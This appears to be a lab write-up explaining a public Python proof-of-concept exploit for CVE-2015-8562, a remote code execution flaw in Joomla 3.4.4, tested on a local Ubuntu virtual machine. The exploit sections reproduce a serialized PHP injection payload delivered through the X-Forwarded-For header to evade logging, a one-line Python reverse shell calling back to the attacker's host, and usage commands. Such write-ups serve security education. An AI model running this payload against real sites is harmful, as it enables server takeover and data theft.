# Introduction 

In this document, I am going to explain the proof of concept (POC) of vulnerability exploitation where the vulnerability lies in a free and open-source content management system for publishing web content called as “Joomla” version 3.4.4

This vulnerability is listed in the National Vulnerability Database (NVD) as CVE-2015-8562 and allows an attacker to spawn a reverse shell or automate remote code execution (RCE) via the HTTP User-Agent header. The vulnerability exists on this application because the browser information is not filtered properly while saving the session values into the database. This issue leads to a remote code execution vulnerability.

Here, I like to mention that the original developer of this exploit is Mr. Gary at Sec-1 ltd and later this exploit is modified by Mr. Andrew McNichol at BreakPoint Labs AKA 0xcc_labs.

# Test Environment, Tools, and Versions. 

*	Host Operating System – Microsoft Windows 10 Pro Version 1909
*	Virtual Operating System which I performed all tasks – Kali Linux Version 2020.1    
*	Virtual Server Operating System (OS) – Ubuntu 14.04.02 LTS (minimal) 
*	Vulnerable Application – Joomla version 3.4.4 Stable Full Package
*	Hypervisor – Oracle VM VirtualBox 6.0.20  
*	Text editor – VS Code (Windows) and VIM editor (Linux)


# Installing Joomla in Ubuntu server

Before configuring the Joomla in my Ubuntu server, I first make sure that my server has LAMP (Linux, Apache, MySQL, PHP) configured and up and running. I did this because I wanted to configure and host a proper website in my Joomla CMS (content management system) to make this exploitation as real as possible because, in the practical scenario, there is no halfway configured content management systems.
The steps I took as follows, 

1. Install MySQL
Using “sudo apt-get install mysql-server mysql-client” command and providing with required root username and password to the root user of SQL.

2. Install Apache2
Using “sudo apt-get install apache2” command and tested using “http://ubuntu-ip”

3. Install PHP5 
Using “sudo apt-get install php5 libapache2-mod-php5” after that restarting the apache service using “service apache2 restart”

4. Get MySQL support in PHP5
This is an additional step I took to make this proof of concept as real as possible. So, to do this first I searched available packages available for me using “sudo apt-cache search php5” and I picked a list of packages and install them by using the following command,<br>
`“apt-get install php5-mysql php5-curl php5-gd php5-intl php-pear php5-imagick php5-imap php5-mcrypt php5-memcache php5-ming php5-ps php5-pspell php5-recode php5-snmp php5-sqlite php5-tidy php5-xmlrpc php5-xsl”`<br> 
Restarted my apache service again to apply changes. 

5. Install phpMyAdmin
Installed phpMyAdmin using “sudo apt-get install phpmyadmin” and provided necessary parameters required when installing. 
Tested with “http://ubuntu-ip/phpmyadmin/”
  
After installing and configuring LAMP in my ubuntu server, I moved on with my Joomla configuration. 
The steps I took as follows, 
1. Database configuration for Joomla. 
Create a database for Joomla. Start SQL server using “mysql -u root -p” and provide the root user password for the SQL server. 
Then type “CREATE DATABASE <data base name>;” to create a database. Use “CREATE USER <username>@localhost;” to add a new user and then set a password using “SET PASSWORD FOR <username>@localhost=PASSWORD(‘<password>’);”
Giving privileges to the user with “GRANT ALL PRIVILEGES ON <data base name>.* TO < username >@localhost IDENTIFIED BY ‘<password>’;”
Finally, use “FLUSH PRIVILEGES;” and then “exit”. 
Restart following services,
*	service apache2 restart
*	service mysql restart  

2. Install Joomla.
I downloaded the vulnerable application from exploit-db. (https://www.exploit-db.com/apps/871953a6ff8ccb9385ad7c0db35e7fe8-Joomla_3.4.4-Stable-Full_Package.tar.bz2) and extract this application into directory in /var/www/html/joomla (I created the joomla directory). 
Gave the required permissions.
1. chown -R www-data.www-data /var/www/html/joomla
2. chmod -R 755 /var/www/html/joomla   
Test the configurations using “http://ubuntu-ip/joomla”

3. Configure Joomla and host a test website. 
Went to the above URL (http://ubuntu-ip/joomla) and provided with necessary details and proceed to next page by clicking “Next” button. And there also provided the necessary details. Finally, I successfully hosted my test website.
![1](https://user-images.githubusercontent.com/37071700/81484636-b9371080-9264-11ea-8556-b562397e11a4.png)<br><br>

# The Python exploit.   

As I mentioned earlier, the original author of this exploit is Mr. Gary at Sec-1 ltd and later this exploit is modified by Mr. Andrew McNichol at BreakPoint Labs AKA 0xcc_labs.<br> 
In this document, I am going to explain the exploit and perform an attack against the Joomla content management system (CMS) I configured in my Ubuntu server.<br> 
This exploit is a Python source which is modified to use the “X-forwarded-For” header instead of “User-Agent” to avoid default logged to access.log.<br>  
Moving on to the exploit, the first line is the selection of the python environment.<br> 
`#!/usr/bin/env python` <br><br>
Then the imports,<br><br> 
`import requests`<br>
`import subprocess`<br>
`import argparse`<br>
`import sys`<br>
`import base64` <br><br>
requests are imported to handle HTTP/1.1 requests.<br> 
The subprocess module allows to spawn new processes, connect to their input/output/error pipes, and obtain their return codes. 
 argparse is the recommended command-line parsing module in the Python standard library.<br> 
sys module provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter.<br> 
base64 module provides data encoding and decoding as specified in RFC 3548 (https://tools.ietf.org/html/rfc3548.html).<br><br>
After the imports, there is a function for getting the URLs. This function is called as “get-url” which will take the “url” and the “user agent” as the parameters.<br>
![2](https://user-images.githubusercontent.com/37071700/81484728-a7a23880-9265-11ea-8315-9857deb817cb.png)<br><br>

Here, all User-Agent headers are defined and then again defined the ‘X-forwarded-For’ header instead of the User-Agent. Then the cookie grabbing for the request URL. And finally return with the response. <br>
Next, there is a string (mostly URL) conversion & encoding function for the use in php. This function is called as “php_str_noquotes” and has ‘data’ as its  parameter.<br>
![3](https://user-images.githubusercontent.com/37071700/81484755-d3bdb980-9265-11ea-95b2-cf71c104c5c7.png)<br><br>
Next there is a function to generate the payload called “generate_payload” and take the “php payload” as the parameter. <br>
![4](https://user-images.githubusercontent.com/37071700/81484773-0071d100-9266-11ea-8ffa-84806729d388.png)<br><br>
Here the function will get the php payload as the parameter and then by using “eval” it is going to evaluate the strings it got as PHP code and then format and encode them according to the function “php_str_noquotes”. <br>
When we grab the cookies (with session cookie value), we send a subsequent request with the session cookie set. When the runtime of this payload, firs the X-Forwarded-For header was inserted into the MySQL database and is un-serialized on the subsequent request. To overcome this issue, we need to append four UTF-8 characters to the end of the payload. So, in this exploit they used a variable called `“terminate”` with the value of `‘\xf0\xfd\xfd\xfd’` which will shorten the payload, allowing the code to execute.<br><br>
`terminate = '\xf0\xfd\xfd\xfd';`<br><br>
The usage of this is as bellow, <br><br>
    `exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";
                  b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql"
                         :0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}'''+ terminate ` <br><br>
Here you can see the variable “exploit_template” has the exploit def and finally the four UTF-8 characters. <br><br>
Finally, the main function where all these methods and functions are been executed. <br>
Here the first thing the developers done was, initializing input parameters to handled when we are executing the python script.<br>
![5](https://user-images.githubusercontent.com/37071700/81484849-a291b900-9266-11ea-9eb5-865d91544298.png)<br><br>
This will replace all the required parameters according to the user input. (Ex- RHOST, LPORT, LHOST etc.)<br><br>
Next the code execution happens according to the arguments provided by the exploiter (the user). If the argument is “--cmd” it is going to perform the blind RCE task (Remote Code Execution).<br>
![6](https://user-images.githubusercontent.com/37071700/81484876-d40a8480-9266-11ea-87da-7532eb57cebf.png)<br><br>
If the arguments have “ -l ” and “ -p ” which are LPORT and LHOST, it is going to spawn a reverse shell using netcat listener on the victim.<br> 
In this function the developers used the famous pentestmonkey’s Python reverse shell with one line.<br>
![7](https://user-images.githubusercontent.com/37071700/81484898-fac8bb00-9266-11ea-86e0-7b85a7506207.png)<br><br>
In our exploit, this reverse shell is used in a single line passing our connection as the parameter.<br>
`shell_str = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('''+connection+'''));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''`<br><br>
Then for be in the safe side, we encode the above python reverse shell as some characters maybe an issue when executing the exploit.<br><br>
`encoded_comm = base64.b64encode(shell_str)`<br><br>
Then the payload execution, here we first create a temporary file in server’s /tmp/ directory as “/tmp/newhnewh.py” and then upload the python reverse shell to it. <br><br>
Then it spawns a shell listener using netcat on LHOST (Our machine) and then executes python reverse shell back to our defined terminal (LHOST:LPORT).<br>
![8](https://user-images.githubusercontent.com/37071700/81484955-6a3eaa80-9267-11ea-8389-6767749152b4.png)<br><br>
# Exploitation.

I tryout this exploit using a Kali Linux Version 2020.1 and following are the steps I took accordingly. 
1. Test the connectivity using the Kali Linux’s web browser.
![9](https://user-images.githubusercontent.com/37071700/81484992-b38efa00-9267-11ea-970b-72121cfddc60.png)<br><br>
![10](https://user-images.githubusercontent.com/37071700/81485010-c7d2f700-9267-11ea-8acf-bf9f759b14f3.png)<br><br>
2. Fire up the terminal and test the Remote Code Execution (RCE) exploitation.<br><br>
By typing “python <exploit>.py -t http://ubuntu-ip/ --cmd” we can get a shell-like environment to perform blind remote code   execution.
  ![11](https://user-images.githubusercontent.com/37071700/81485049-17192780-9268-11ea-9c9e-77610dfc1144.png)<br><br>
  
In the above image you can see that I receive an HTTP/1.1 response saying that <Response [200]><br>
Response 200 is a HTTP/1.1 response which states that the request has succeeded.<br> 
(Ref : https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html)<br><br>
3. Next test, the reverse shell exploitation.<br><br> 
By typing “python <exploit>.py -t http://ubuntu-ip/ -l <localhost> -p <port>” we can get a reverse shell separately in another terminal. I used python -c "import pty;pty.spawn('/bin/bash')" to get the shell and tested with pwd command.
  ![12](https://user-images.githubusercontent.com/37071700/81485141-8abb3480-9268-11ea-9107-43b8da283e18.png)<br><br>
  ![13](https://user-images.githubusercontent.com/37071700/81485150-8d1d8e80-9268-11ea-8251-2251af52f91a.png)<br><br>

### A video demonstration is available in [Google Drive](https://drive.google.com/open?id=183NTE-T1UNbz8NaRvBNxa6Dhmca9j2xr) or [YouTube](https://youtu.be/8StSyaqUDF0).

